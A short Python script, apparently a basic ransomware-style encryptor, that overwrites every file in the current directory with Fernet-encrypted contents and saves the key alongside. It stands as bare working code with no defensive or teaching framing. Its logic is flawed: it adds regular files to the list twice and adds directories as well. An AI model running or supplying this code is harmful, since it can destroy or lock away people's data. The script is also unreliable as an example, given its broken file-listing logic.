import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "the_key.key" or file == "decrypt.py":
        continue
    files.append(file)
    if os.path.isfile(file):
        files.append(file)

print(files)

key = Fernet.generate_key()
# print(key)

with open("the_key.key", "wb") as the_key:
    the_key.write(key)

for file in files:
    with open(file, "rb") as the_file:
        contents = the_file.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(contents_encrypted)

print("Files Encrypted")

